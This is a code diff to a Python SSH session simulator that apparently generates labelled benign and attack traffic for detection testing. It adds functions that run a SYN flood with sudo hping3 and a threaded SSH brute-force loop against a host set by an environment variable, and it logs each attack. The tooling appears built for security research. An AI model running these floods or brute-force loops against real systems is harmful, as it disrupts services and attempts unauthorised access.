@@ -159,7 +159,7 @@ class SSHClient:
         self.client.connect(self.host, username=self.username, password=self.password, port=30002)
         first = random.choices(self.options,weights=first_actions)[0]
         first()
-        time.sleep(random.randint(10,20))
+        time.sleep(random.randint(0,120))
 
     def _bruteforce_thread(self): 
         try:
@@ -169,49 +169,67 @@ class SSHClient:
         except Exception as e: 
             print("Failed e")
             client.close()
+    def run_flood(self,f): 
+        f.write("Ran malicious DoS at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
+        pswd = os.environ["spass"] 
+        proc = subprocess.Popen(['sudo', '-S', 'timeout',"10","hping3","-S",os.environ["IP"],"-p","30002","--flood"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate(input=pswd.encode('utf-8'))
+        print(proc)
+
+    def run_bruteforce(self,f): 
+        f.write("Ran malicious Brute Force at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
+        self.exit()
+        start_time = time.time()
+        trs = []
+        while (time.time() - start_time < 10):
+            tr = Thread(target=self._bruteforce_thread)
+            trs.append(tr)
+            tr.start()
+        print("No more threads")
+        for thread in trs: 
+            thread.join()
+        self.client = paramiko.client.SSHClient()
+        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        self.client.connect(self.host, username=self.username, password=self.password, port=30002)
+
+    def run_malicious(self,atk_type = ''): 
+        file = 'malicious.log'
+        if os.environ.get('outfile'): 
+            file = os.environ.get('outfile')
+        with open(file,'a') as f:
+            if atk_type == 'f': 
+                self.run_flood(f)
+            elif atk_type == "b":
+                self.run_bruteforce(f)
+            else: 
+                if random.random() < 0.5: 
+                    self.run_flood(f)
+                else: 
+                    self.run_bruteforce(f)
 
     def add_malicious(self):
-        time.sleep(random.randint(60,90))
         if random.random() < 0.2: 
-            with open('malicious.log','xa') as f:
-                if random.random() < 0.5: 
-                    f.write("Ran malicious DoS at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
-                    proc = subprocess.Popen(['sudo', '-S', 'timeout',"10","hping3","-S",os.environ["IP"],"-p","30002","--flood"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate(input=b'tst\n')
-                    print(proc)
-                else: 
-                    f.write("Ran malicious Brute Force at " +  datetime.now().strftime("%d/%m/%Y %H:%M:%S:%f") + "\n")
-                    self.exit()
-                    start_time = time.time()
-                    trs = []
-                    while (time.time() - start_time < 10):
-                        tr = Thread(target=self._bruteforce_thread)
-                        trs.append(tr)
-                        tr.start()
-                    print("No more threads")
-                    for thread in trs: 
-                        thread.join()
-                    self.client = paramiko.client.SSHClient()
-                    self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                    self.client.connect(self.host, username=self.username, password=self.password, port=30002)
+            self.run_malicious()
         else: 
             self.simulate_session()
+        # time.sleep(random.randint(60,90))
 
 
 
 def main(): 
-    if os.environ.get('IP') == None: 
+    if os.environ.get('IP') == None or os.environ.get('spass') == None: 
         print("$IP not set. Set to the IP of the remote host and rerun.")
     client = SSHClient()
-    client.simulate_session()
+    for i in range(10): 
+        client.simulate_session()
     # client.simulate_session()
-    client.simulate_session()
+    # client.simulate_session()
 
-    client.simulate_session()
+    # client.simulate_session()
 
-    client.simulate_session()
+    # client.simulate_session()
 
-    client.simulate_session()
-
+    # client.simulate_session()
+    # if "y" in input("Proceed to malicious testing?"):
     while True: 
         client.add_malicious()
 
